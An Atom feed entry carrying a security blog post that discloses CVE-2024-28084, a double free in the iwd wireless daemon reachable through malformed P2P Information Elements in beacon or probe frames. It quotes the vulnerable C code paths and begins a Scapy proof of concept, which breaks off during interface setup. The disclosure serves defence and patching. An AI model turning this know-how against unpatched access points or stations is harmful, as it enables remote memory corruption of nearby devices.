        <link href="https://www.supernetworks.org/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084"/>
        <updated>2024-03-11T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[CVE-2024-28084 Patched in Inet Wireless Daemon 2.16]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cve-2024-28084-patched-in-inet-wireless-daemon-216">CVE-2024-28084 Patched in Inet Wireless Daemon 2.16<a href="https://www.supernetworks.org/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084#cve-2024-28084-patched-in-inet-wireless-daemon-216" class="hash-link" aria-label="Direct link to CVE-2024-28084 Patched in Inet Wireless Daemon 2.16" title="Direct link to CVE-2024-28084 Patched in Inet Wireless Daemon 2.16">​</a></h2>
<p>While preparing some wifi security training, we found a double free vulnerability affecting
APs and Stations running <a href="https://iwd.wiki.kernel.org/" target="_blank" rel="noopener noreferrer"><code>iwd</code></a>. This issue was reported and <a href="https://git.kernel.org/pub/scm/network/wireless/iwd.git/commit/?id=52a47c9fd428904de611a90cbf8b223af879684d" target="_blank" rel="noopener noreferrer">patched</a> with fixes available starting in version 2.16.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="supernetworks--memory-safety">Supernetworks &amp; Memory Safety<a href="https://www.supernetworks.org/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084#supernetworks--memory-safety" class="hash-link" aria-label="Direct link to Supernetworks &amp; Memory Safety" title="Direct link to Supernetworks &amp; Memory Safety">​</a></h2>
<p>Writing secure native code is not simple nor easy. With SPR we're striving to build a project that's secure by default with memory safety throughout the stack. We're continuing to develop a softmac-based solution to eliminate protocol parsing using native code in firmware, drivers and userland. If you're interested in joining this effort <a href="mailto:outreach@supernetworks.org" target="_blank" rel="noopener noreferrer">let us know</a>.</p>
<p>We also offer WiFi &amp; Network Security training spanning from Digital Signals Processing to Cryptography to Protocol and Coding safety covering enterprise wifi and WPA2/3. If you're interested get in touch at <a href="mailto:trainings@supernetworks.org" target="_blank" rel="noopener noreferrer"><code>training@supernetworks.org</code></a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-double-free-with-less-than-30-bytes">A Double Free With Less Than 30 Bytes<a href="https://www.supernetworks.org/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084#a-double-free-with-less-than-30-bytes" class="hash-link" aria-label="Direct link to A Double Free With Less Than 30 Bytes" title="Direct link to A Double Free With Less Than 30 Bytes">​</a></h2>
<p>The issue can be triggered remotely by sending a malformed Information Element inside of a beacon, a probe request, or a probe response. These are unauthenticated frames that a malicious attacker with physical proximity can send remotely.</p>
<p>The double free happens while parsing a P2P Information Elements (IEs) with a malformed ADVERTISED_SVC_INFO attribute.
In the context of the flaw, remote double frees are especially powerful as they can lead to information leaks to help bypass ASLR and other hardening measures.</p>
<p><img decoding="async" loading="lazy" src="https://www.supernetworks.org/pages/assets/images/cve-2024-28084-12dc774a5319ea885facf57a8eb0a08a.png" width="2928" height="992" class="img_ev3q"></p>
<p>Technical details are below.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="code-overview">Code Overview<a href="https://www.supernetworks.org/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084#code-overview" class="hash-link" aria-label="Direct link to Code Overview" title="Direct link to Code Overview">​</a></h3>
<p>Under <code>p2p_parse_probe_resp()</code>, the ADVERTISED_SVC_INFO attribute is captured.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">	r </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">p2p_parse_attrs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pdu</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">REQUIRED</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">P2P_CAPABILITY</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">capability</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">OPTIONAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">EXTENDED_LISTEN_TIMING</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">					</span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">listen_availability</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">OPTIONAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">NOTICE_OF_ABSENCE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">notice_of_absence</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">REQUIRED</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">P2P_DEVICE_INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">device_info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">OPTIONAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">P2P_GROUP_INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">group_clients</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">OPTIONAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">ADVERTISED_SVC_INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">advertised_svcs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">r </span><span class="token operator">&gt;=</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token function" style="color:rgb(80, 250, 123)">memcpy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">sizeof</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_probe_resp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>While parsing this attribute in <code>extract_p2p_advertised_service_info()</code>, errors in processing will result in the queue pointer allocated at [3] to be released [4]:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">static</span><span class="token plain"> bool </span><span class="token function" style="color:rgb(80, 250, 123)">extract_p2p_advertised_service_info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">const</span><span class="token plain"> </span><span class="token class-name">uint8_t</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token plain"> len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">						</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">struct</span><span class="token plain"> </span><span class="token class-name">l_queue</span><span class="token plain"> </span><span class="token operator">*</span><span class="token operator">*</span><span class="token plain">out </span><span class="token operator">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">struct</span><span class="token plain"> </span><span class="token class-name">p2p_advertised_service_descriptor</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">desc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> name_len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">len </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">7</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">goto</span><span class="token plain"> error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		name_len </span><span class="token operator">=</span><span class="token plain"> attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">6</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">len </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">7u</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> name_len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">goto</span><span class="token plain"> error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">!</span><span class="token function" style="color:rgb(80, 250, 123)">l_utf8_validate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">const</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> </span><span class="token operator">*</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> attr </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">7</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> name_len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token constant" style="color:rgb(189, 147, 249)">NULL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">goto</span><span class="token plain"> error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">!</span><span class="token operator">*</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token operator">*</span><span class="token plain">out </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">l_queue_new</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">error</span><span class="token operator">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">l_queue_destroy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">*</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> p2p_clear_advertised_service_descriptor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>However when the parent function finishes, <code>p2p_clear_probe_resp()</code> will also free [2] the <code>advertised_svcs</code> data structures.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_probe_resp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">struct</span><span class="token plain"> </span><span class="token class-name">p2p_probe_resp</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_notice_of_absence_attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">data</span><span class="token operator">-&gt;</span><span class="token plain">notice_of_absence</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_device_info_attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">data</span><span class="token operator">-&gt;</span><span class="token plain">device_info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_group_info_attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">data</span><span class="token operator">-&gt;</span><span class="token plain">group_clients</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">p2p_clear_advertised_service_info_attr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">data</span><span class="token operator">-&gt;</span><span class="token plain">advertised_svcs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="scapy-poc">Scapy POC<a href="https://www.supernetworks.org/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084#scapy-poc" class="hash-link" aria-label="Direct link to Scapy POC" title="Direct link to Scapy POC">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">CVE-2024-28084 beacon double free vulnerability due to error handling in extract_p2p_advertised_service_info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> scapy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">layers</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dot11 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> scapy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">arch </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> str2mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> get_if_raw_hwaddr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> time </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> sleep</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">if_hwaddr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iff</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> str2mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">get_if_raw_hwaddr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iff</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">config_mon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""set the interface in monitor mode and then change channel using iw"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"ip link set dev %s down"</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" 